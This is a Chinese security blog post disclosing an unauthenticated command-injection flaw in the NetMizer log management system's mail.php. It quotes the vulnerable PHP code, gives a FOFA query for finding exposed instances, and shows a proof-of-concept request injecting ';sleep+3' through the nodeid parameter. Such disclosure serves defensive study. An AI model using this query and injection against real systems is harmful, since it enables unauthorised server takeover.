---
title: "NetMizer日志管理系统 mail.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-search-mail-nodeid-rce.html
asset_dir: assets/netmizer日志管理系统-mail.php-命令执行漏洞
---

# NetMizer日志管理系统 mail.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/17 08:37
* 646浏览
* [0评论](#comment)
* 1小时阅读

深入探索

网页服务器

应用程序

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/mail.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞预警服务

# 影响版本

老旧版本

# fofa语法

> `body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `mail.php` 业务实现关键逻辑部分

```
<?php
        include('../include/JSON.php');

        $cmd = "/var/www/cgi-bin/search_mail";

        list($year,$month,$day,$hour,$min,$second)=split(":| |-", $starttime);
        $start_time = mktime($hour, $min, $second, $month,$day,$year);
        $cmd .= " -s $start_time";
        list($year,$month,$day,$hour,$min,$second)=split(":| |-", $stoptime);
        $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
        $cmd .= " -e $stop_time";

        if($nodeid != ""){
                $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
                $cmd .= " -n $nodeid";
        } else        $sql_nodeid = "";

        $srcip = $src;
        if($srcip == ""){
                $srcid = "-1";
        } else $srcid = ip2long($srcip); 
        if($srcid != "-1"){
                $sql_srcid = " and src_addr = $srcid ";
                $cmd .= " -S $srcid";
        } else {
                $sql_srcid = "";
        }

        $user = $username;
        if($user != ""){
                $sql_user = " and user_name = \"$user\" ";
                $cmd .= " -u $user";
        } else {
                $sql_user = "";
        }

        if($send_user != ""){
                $sql_mail = " and send_user = \"$send_user\" ";
                $cmd .= " -q $send_user";
        } else {
                $sql_mail = "";
        }

        if($action == 'file'){
                //echo $cmd."\n";
                $fp = @popen($cmd,"r");
                if(!$fp){
                        echo '{"success":true,"info":"no data"}';
                        return;
                }

                if($csv){
                        Header("Content-type: application/octet-stream; filename=\"QQ$qq查询统计.csv\"");
                        Header("Content-Disposition: attachment; filename=\"QQ$qq查询统计.csv\"");
                        echo "序号,用户名称,设备节点,登录时间,登录QQ号,登录地址,登录端口,目标地址,目标端口\n";
                        $i = 0;
                        while($line = fgets($fp)){
                                $line = str_replace(PHP_EOL,'',$line);
                                $items = explode(",",$line);
                                echo ($i + 1).",".
                                        $items[1].",".
                                        $items[0].",".
                                        $items[12].",".
                                        $items[6].",".
                                        $items[2].",".
                                        $items[4].",".
                                        $items[3].",".
                                        $items[5]."\n";
                                $i ++;
                        }
                        mysql_close($conn_id);
                        return;
                }

                $i = 0;
                $ra = array();
                while($line = fgets($fp)){
                        if($i >= $start && $i < $start+$limit){
                                $line = str_replace(PHP_EOL,'',$line);
                                $items = explode(",",$line);
                                $ra[] = array(
                                        "top"=>$i + 1,
                                        "user_name"=>$items[1],
                                        "create_time"=>$items[12],
                                        "from_num"=>$items[6],
                                        "src_addr"=>$items[2],
                                        "src_port"=>$items[4],
                                        "dst_addr"=>$items[3],
                                        "dst_port"=>$items[5],
                                        "nodeid"=>$items[0]
                                );
                        }
                        $i ++;
                }
                pclose($fp);
                $str = array("success"=>'success', "total"=>$i, "datas"=>$ra);
                $json = json_encode($str);
                echo $json;
                return;
        }

        $conn_id = mysql_connect($dsn,$dbuser,$dbpasswd);
        mysql_select_db("sysmonitor");
        $sqlstr = "select * from tbl_mail_log where create_time>=$start_time and create_time<$stop_time $sql_nodeid $sql_user $sql_srcid $sql_mail order by create_time desc";
        $res=mysql_query($sqlstr);

        if($csv){
                Header("Content-type: application/octet-stream; filename=\"邮件$send_user查询统计.csv\"");
                Header("Content-Disposition: attachment; filename=\"邮件$send_user查询统计.csv\"");
                echo "序号,用户名称,设备节点,登录时间,发件人,主题,协议,来源地址,来源端口,目标地址,目标端口\n";
                $i = 0;
                while($row = mysql_fetch_array($res,MYSQL_BOTH)){
                        $subject = $row["subject"];
                        $subject = str_replace(',','%2C',$subject);
                        $subject = mb_check_encoding($subject, 'UTF-8') ? mb_convert_encoding($subject, 'gbk', 'UTF-8') : $subject;
                        $type = $row['mail_type'];
                        if($type == 1) $type = 'SMTP';
                        else if($type == 2) $type = 'POP3';
                        else if($type == 3) $type = 'IMAP';
                        echo ($i + 1).",".
                                $row["user_name"].",".
                                long2ip($row["nodeid"]).",".
                                date("y-m-d H:i:s", $row["create_time"]).",".
                                $row["send_user"].",".
                                $subject.",".
                                $type.",".
                                long2ip($row["src_addr"]).",".
                                $row["src_port"].",".
                                long2ip($row["dst_addr"]).",".
                                $row["dst_port"]."\n";
                        $i ++;
                }
                mysql_close($conn_id);
                return;
        }

        $i = 0;
        $ra = array();
        while($row = mysql_fetch_array($res,MYSQL_BOTH)){
                if($i >= $start && $i < $start+$limit)
                        $subject = $row["subject"];
                        $subject = mb_check_encoding($subject, 'UTF-8') ? $subject : mb_convert_encoding($subject, 'UTF-8', 'gbk');
                        $ra[] = array(
                                "top"=>$i + 1,
                                "user_name"=>$row["user_name"],
                                "create_time"=>date("y-m-d H:i:s", $row["create_time"]),
                                "send_user"=>$row["send_user"],
                                "subject"=>$subject,
                                "mail_type"=>$row["mail_type"],
                                "src_addr"=>long2ip($row["src_addr"]),
                                "src_port"=>$row["src_port"],
                                "dst_addr"=>long2ip($row["dst_addr"]),
                                "dst_port"=>$row["dst_port"],
                                "nodeid"=>long2ip($row["nodeid"])
                        );
                $i ++;
        }
        mysql_close($conn_id);
        $str = array("success"=>'success', "total"=>$i, "datas"=>$ra);
        $json = json_encode($str);
        echo $json;
?>
```

在构建外部命令 `$cmd` 时，直接将用户可控参数（如 `$nodeid`、`$srcid`、`$user` 和 `$send_user`）拼接进命令字符串中，并通过 `popen($cmd, "r")` 执行。该过程未对用户输入进行任何过滤或转义，导致攻击者可以通过这些参数注入额外的命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/search/mail.php?action=file&nodeid=1;sleep+3 HTTP/1.1
Host: netmizer.mrxn.net
```

成功执行 延时 3 秒

[![NetMizer日志管理系统 mail.php 命令执行漏洞](images/img-001-f4481219be17.webp)](https://image.mrxn.net/a4c22958edf5475f9f62364882165314.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 mail.php 命令执行漏洞](https://mrxn.net/jswz/netmizer-search-mail-nodeid-rce.html)  
文章链接：<https://mrxn.net/jswz/netmizer-search-mail-nodeid-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

计算机服务器

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-search-mail-nodeid-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网站托管与域名注册

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAALpklEQVR4AeyagXbcuA5Dc/v//7wvMA4kSpY9njTJzNt1T1CIIEgpot2kaf98fHz881X888Sv7HFWEk/4zLvKpS4cT+LKyYVr7mgdb7j6VlrNX11rIJ/e++NdbqAN5HPCH1dx5fDAB9Cs6d2EsgA27xVPKTtczn3mWIXgPbUWVp5oYfkEcG10sfQKaVdR69pAqnivX3cDu4GApw97Pjom2HuUrzrYC52TB2t5ssAx0N7e2QvdM+fmOH0rQ6+Hvo88c33iZxjG/tDjVZ/dQFamW/u9G/jxgUB/ImD9BM6fLrhGT2kwexInL541cJ/o4BiIdMrA6dc2cB447fNM8scH8sxhbu/Hx7cMRE+nAGxPFPQ3Yb5k2HtUK8zeGkOvA1oKaHtGBGvqKUTXOoC1B6wDKWv9gW3dEj+w+JaB/MC5/rMtf2Yg/9nr/PtPfDeQvNIrfrRdrYHx9a65rMEeMJ/1T008iVccTzge8D6w/yM1nq9y9pr5rN/sVbwbiMQbr7uBNhDoTw+cr+fjgv2zrjhPCDz2yC/MNYDkJYDtCy2wzEsENk/6isGa8gKM8UqD0QOOAdkHANue8JhrYRtIFe/1627gj56WryLHTn1icTTwEyJNAMeAwg3A9jRtwedvMMaf0uFH9hEfmZQTal6xEE1rAbw39K8zYC1ecCx/kFzir/L9huQm34QPBwJ+CqBzzgxdAyKfcp6YaooWrjmto4uB5VsE1qGzagWwpvUMGHMwxtWv/Veonitr8B5gXtUcDmRlvrWfv4E/4GnByHkiVkdILgyuPfOCPakRg7XUSRMSg/PQ/zxX/gipC8eXuPJRLroYvH/qwDE85lWNegrJrfj/6Q1Znf9fp90DebORtm97cy69UgL4tYwuBmtglnYEWHvAOvQ/hqBr0HWdI5j3AddU/cgbD7gG9pxa6Lm5LnG8leccuE/0yqkDe6Dz/YbUm3qDdfuinrOAp5V4xfOE5xhYlW1avOJNOPkN2L7Vhc4n9uZVbwFclxppR1h5ol3h9I03ceXk4Phc9xuSW3oT3g0kE12dLzkYJwyOkxenHsYcOAZi2TGwPe3qMwOcSxE4BiIdMrD1hc4xg7XElR+dQV5wPTzmuZ/qg91Akrj5NTew+y4LPOEcp05z1hKvOHVzLroYvJfWwuytMay9qpsBa2/tlzXYm7hy+sLaA9ahf2eY+tSuOB5wfWLx/YboFt4I90DeaBg6Svu2d/VqSQO/VoD8G4Dti+MWfP4mnwDWgU/VH9IFR+Pv0gXgcj8YvWPHMQJ7way9gtH50f6rKtgLNMujGuWb+cIC2D5f1Qm15H5D6m28wboNBDw1GFkTDMC5xDk/WE+8Yth7YNTSF0Zd/ZLT+lmsalea+kYXKxbA5wGzcgI4hs7SBbCm+gBGDRxD5zaQFN382htoA9FUV1gdDzzR5FZ1YA+Y40mNeKVVPXkxuI/ygjQBrENn5QXlBXBOWgB7TTmwDp3Vo0I+YaVJF5LTOogWXultIEne/NobaAOB/kQA7VTA9h0B0LR5wi1RFvGEga1Ps